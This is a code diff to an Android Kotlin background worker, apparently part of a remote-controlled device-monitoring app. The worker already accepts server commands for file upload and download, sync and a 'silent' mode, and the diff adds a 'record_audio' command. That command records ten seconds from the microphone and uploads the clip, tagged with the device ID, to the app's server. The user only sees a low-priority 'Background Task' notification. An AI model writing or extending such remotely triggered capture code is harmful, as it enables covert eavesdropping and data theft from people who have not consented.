@@ -1,14 +1,17 @@
-// DataFetchWorker.kt
 package com.elfinsaddle.worker
 
 import android.Manifest
 import android.content.Context
 import android.content.pm.PackageManager
 import android.location.Location
+import android.media.MediaRecorder
+import android.os.Build
 import android.util.Log
+import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import androidx.work.*
 import com.elfinsaddle.MainApplication
+import com.elfinsaddle.R
 import com.elfinsaddle.data.remote.ApiClient
 import com.elfinsaddle.data.remote.NetworkResult
 import com.elfinsaddle.data.repository.DeviceRepository
@@ -17,9 +20,11 @@ import com.elfinsaddle.util.SystemInfoManager
 import com.google.android.gms.location.LocationServices
 import com.google.android.gms.location.Priority
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.tasks.await
 import kotlinx.coroutines.withContext
 import java.io.File
+import java.io.IOException
 
 class DataFetchWorker(
     appContext: Context,
@@ -28,8 +33,15 @@ class DataFetchWorker(
 
     companion object {
         private const val TAG = "DataFetchWorker"
+        private const val FOREGROUND_NOTIFICATION_ID = 3
+        private const val RECORDING_DURATION_MS = 10_000L // 10 seconds
+
         const val KEY_COMMAND = "command"
-        const val KEY_FILE_PATH = "filePath" // Re-used for file uploads
+        const val KEY_FILE_PATH = "filePath"
+        const val KEY_IS_SILENT = "silent"
+
+        // Commands
+        const val COMMAND_RECORD_AUDIO = "record_audio"
         const val COMMAND_UPLOAD_AUDIO_RECORDING = "upload_audio_recording"
 
         const val COMMAND_SYNC_ALL = "sync_all"
@@ -40,7 +52,7 @@ class DataFetchWorker(
         const val COMMAND_UPLOAD_FILE = "upload_file"
         const val COMMAND_DOWNLOAD_FILE = "download_file"
         const val COMMAND_PING = "ping"
-        const val KEY_IS_SILENT = "silent"
+
 
         fun scheduleWork(context: Context, command: String, extraData: Map<String, String> = emptyMap()) {
             val dataBuilder = Data.Builder().putString(KEY_COMMAND, command)
@@ -69,6 +81,12 @@ class DataFetchWorker(
         }
 
         Log.i(TAG, "Worker starting for command: $command")
+
+        // Special handling for foreground task
+        if (command == COMMAND_RECORD_AUDIO) {
+            return recordAndUploadAudio()
+        }
+
         return withContext(Dispatchers.IO) {
             try {
                 val success = executeCommand(command)
@@ -96,6 +114,79 @@ class DataFetchWorker(
                 false
             }
         }
+    }
+
+    private suspend fun recordAndUploadAudio(): Result {
+        if (!hasPermission(Manifest.permission.RECORD_AUDIO)) {
+            Log.e(TAG, "Cannot record audio, permission missing.")
+            return Result.failure() // Fail so it doesn't retry without permission
+        }
+
+        val recordingFile = File(applicationContext.cacheDir, "recording_${System.currentTimeMillis()}.amr")
+        var mediaRecorder: MediaRecorder? = null
+
+        try {
+            // 1. Set the worker to run in the foreground
+            val foregroundInfo = createForegroundInfo()
+            setForeground(foregroundInfo)
+
+            // 2. Initialize and start the recorder
+            mediaRecorder = (if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                MediaRecorder(applicationContext)
+            } else {
+                @Suppress("DEPRECATION")
+                MediaRecorder()
+            }).apply {
+                setAudioSource(MediaRecorder.AudioSource.MIC)
+                setOutputFormat(MediaRecorder.OutputFormat.AMR_NB)
+                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
+                setOutputFile(recordingFile.absolutePath)
+                prepare()
+                start()
+            }
+            Log.i(TAG, "Recording started, saving to ${recordingFile.absolutePath}")
+
+            // 3. Wait for the duration
+            delay(RECORDING_DURATION_MS)
+
+        } catch (e: Exception) {
+            Log.e(TAG, "Recording failed during setup or execution", e)
+            return Result.failure()
+        } finally {
+            // 4. Stop and release the recorder
+            try {
+                mediaRecorder?.apply {
+                    stop()
+                    release()
+                }
+                Log.i(TAG, "Recording stopped.")
+            } catch (e: Exception) {
+                Log.e(TAG, "Error stopping media recorder, file might be corrupt.", e)
+            }
+        }
+
+        // 5. Upload the file
+        if (recordingFile.exists() && recordingFile.length() > 0) {
+            Log.d(TAG, "Uploading recorded file: ${recordingFile.name}")
+            val result = apiClient.uploadAudioRecording(recordingFile, systemInfoManager.getDeviceId())
+            // Clean up the file regardless of upload success to prevent filling up storage
+            recordingFile.delete()
+            return if (result is NetworkResult.Success) Result.success() else Result.retry()
+        } else {
+            Log.w(TAG, "Recording file is empty or does not exist. No upload performed.")
+            return Result.failure()
+        }
+    }
+
+    private fun createForegroundInfo(): ForegroundInfo {
+        val notification = NotificationCompat.Builder(applicationContext, MainApplication.AUDIO_RECORDING_CHANNEL_ID)
+            .setContentTitle("Background Task")
+            .setContentText("Recording audio...")
+            .setSmallIcon(R.drawable.ic_recording_dot) // You need a drawable named ic_recording_dot
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .build()
+
+        return ForegroundInfo(FOREGROUND_NOTIFICATION_ID, notification)
     }
 
     private suspend fun syncAllData(): Boolean {
